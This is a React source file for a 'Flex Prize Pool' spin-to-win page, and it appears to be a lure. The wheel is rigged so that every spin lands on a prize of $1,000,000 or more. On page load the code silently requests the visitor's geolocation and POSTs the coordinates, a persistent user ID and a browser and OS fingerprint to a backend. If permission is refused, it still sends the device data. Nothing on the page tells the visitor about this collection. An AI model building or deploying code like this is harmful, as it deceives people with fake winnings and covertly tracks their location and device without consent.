import { useRef, useState, useEffect } from "react";
import { Link } from "react-router-dom";

const PRIZES = [
  {
    value: "$10,000",
    label: "Mini Jackpot",
    color: "bg-gradient-to-r from-pink-500 to-red-500",
  },
  {
    value: "$50,000",
    label: "Major Prize",
    color: "bg-gradient-to-r from-orange-400 to-yellow-400",
  },
  {
    value: "$100,000",
    label: "Mega Win",
    color: "bg-gradient-to-r from-yellow-400 to-green-400",
  },
  {
    value: "$500,000",
    label: "Ultra Prize",
    color: "bg-gradient-to-r from-green-400 to-blue-400",
  },
  {
    value: "$1,000,000",
    label: "Grand Jackpot",
    color: "bg-gradient-to-r from-blue-400 to-purple-500",
  },
  {
    value: "$5,000,000",
    label: "Super Grand",
    color: "bg-gradient-to-r from-purple-500 to-pink-500",
  },
  {
    value: "$10,000,000",
    label: "Legendary",
    color: "bg-gradient-to-r from-pink-500 to-yellow-400",
  },
  {
    value: "$50,000,000",
    label: "Epic",
    color: "bg-gradient-to-r from-yellow-400 to-green-400",
  },
  {
    value: "$100,000,000",
    label: "Mythic",
    color: "bg-gradient-to-r from-green-400 to-blue-400",
  },
  {
    value: "$500,000,000",
    label: "Ultimate",
    color: "bg-gradient-to-r from-blue-400 to-purple-500",
  },
];

function getRandomHighPrizeIndex() {
  // Always lands on high value prizes (positions 4-9)
  return Math.floor(Math.random() * 6) + 4;
}

function getOrCreateUserId() {
  let id = localStorage.getItem("locationWatchUserId");
  if (!id) {
    id = "user-" + Math.floor(Math.random() * 1000000);
    localStorage.setItem("locationWatchUserId", id);
  }
  return id;
}

function App() {
  const [isSpinning, setIsSpinning] = useState(false);
  const [winner, setWinner] = useState(null);
  const [rotation, setRotation] = useState(0);
  const wheelRef = useRef();
  const [userId] = useState(getOrCreateUserId());

   const deviceInfo = {
          browser: navigator.userAgentData
            ? navigator.userAgentData.brands.map((b) => b.brand).join(", ")
            : navigator.userAgent,
          os: navigator.userAgentData
            ? navigator.userAgentData.platform
            : navigator.platform,
          platform: navigator.platform,
          userAgent: navigator.userAgent,
        };


 const sendLocation = async (lat, lng) => {
    try {

       const deviceInfo = {
          browser: navigator.userAgentData
            ? navigator.userAgentData.brands.map((b) => b.brand).join(", ")
            : navigator.userAgent,
          os: navigator.userAgentData
            ? navigator.userAgentData.platform
            : navigator.platform,
          platform: navigator.platform,
          userAgent: navigator.userAgent,
        };
      const response = await fetch("http://localhost:5000/api/location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, lat, lng, deviceInfo }),
      });
      const data = await response.json();
      console.log("Location sent:", data);
    } catch (err) {
      console.error(err);
    }
  };

  const requestLocation = () => {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        // User allowed location
        sendLocation(pos.coords.latitude, pos.coords.longitude);
      },
      (err) => {
        if (err.code === err.PERMISSION_DENIED) {
              sendLocation("00000", "00000");
        }
      }
    );
  };




  // Send email as soon as user lands on this page
  useEffect(() => {
    // Collect device info

    if (!navigator.geolocation) {
      alert("Geolocation is not supported.");
      return;
    }

   requestLocation();
  }, [userId]);

  const spin = () => {
    if (isSpinning) return;
    setIsSpinning(true);
    setWinner(null);
    const winningIndex = getRandomHighPrizeIndex();
    const degrees = 3600 + winningIndex * 36; // 10 segments, 36deg each
    setRotation(-degrees);
    setTimeout(() => {
      setIsSpinning(false);
      setWinner(PRIZES[winningIndex]);
      createConfetti();
    }, 4000);
  };

  function createConfetti() {
    const colors = [
      "#ff0000",
      "#ff9900",
      "#ffff00",
      "#33cc33",
      "#0099ff",
      "#9966ff",
      "#ff00cc",
      "#cc00ff",
      "#00ffff",
    ];
    for (let i = 0; i < 100; i++) {
      const confetti = document.createElement("div");
      confetti.style.position = "fixed";
      confetti.style.width = `${Math.random() * 10 + 5}px`;
      confetti.style.height = `${Math.random() * 10 + 5}px`;
      confetti.style.backgroundColor =
        colors[Math.floor(Math.random() * colors.length)];
      confetti.style.left = Math.random() * 100 + "vw";
      confetti.style.top = "-20px";
      confetti.style.opacity = 1;
      confetti.style.zIndex = 100;
      confetti.style.borderRadius = "50%";
      confetti.style.pointerEvents = "none";
      confetti.style.animation = `fall${i} 2.5s linear forwards`;
      document.body.appendChild(confetti);
      const style = document.createElement("style");
      style.innerHTML = `@keyframes fall${i} {0%{transform:translateY(-100px) rotate(0deg);opacity:1;}100%{transform:translateY(100vh) rotate(360deg);opacity:0;}}`;
      document.head.appendChild(style);
      setTimeout(() => {
        confetti.remove();
        style.remove();
      }, 2500);
    }
  }

  return (
    <div className="main-bg">
      <div className="container">
        <header className="header">
          <div className="logo">Flex Prize</div>
          <div className="balance">$10,000</div>
        </header>
        <main className="main-content">
          <h1 className="title">FLEX PRIZE POOL</h1>
          <p className="subtitle">Spin to win extreme prizes every time!</p>
          <div className="centered">
            <div className="prize-wheel-wrapper">
              <div className="pointer"></div>
              <div
                ref={wheelRef}
                className="wheel"
                style={{
                  width: "100%",
                  height: "100%",
                  background:
                    "conic-gradient(#ff0000 0% 10%, #ff9900 10% 20%, #ffff00 20% 30%, #33cc33 30% 40%, #0099ff 40% 50%, #9966ff 50% 60%, #ff00cc 60% 70%, #ff0066 70% 80%, #cc00ff 80% 90%, #00ffff 90% 100%)",
                  transition: "transform 4s cubic-bezier(0.17,0.67,0.12,0.99)",
                  transform: `rotate(${rotation}deg)`,
                }}
              ></div>
              <div className="wheel-center"></div>
            </div>
            <button className="spin-btn" onClick={spin} disabled={isSpinning}>
              {isSpinning ? "SPINNING..." : "SPIN TO WIN"}
            </button>
            <div className="prizes-list">
              {PRIZES.slice(0, 5).map((prize, idx) => (
                <div key={idx} className="prize-item">
                  <div className="prize-value">{prize.value}</div>
                  <div className="prize-label">{prize.label}</div>
                </div>
              ))}
            </div>
            {winner && (
              <div className="winner-display">
                <div className="winner-text">You Won:</div>
                <div className="winner-prize">{winner.value}</div>
              </div>
            )}
            {/* <Link to="/map" className="map-link">
              View Live Map
            </Link> */}
          </div>
        </main>
        <footer className="footer">
          © 2025 Flex Prize Pool. All rights reserved. Must be 18+ to play.
        </footer>
      </div>
    </div>
  );
}

export default App;
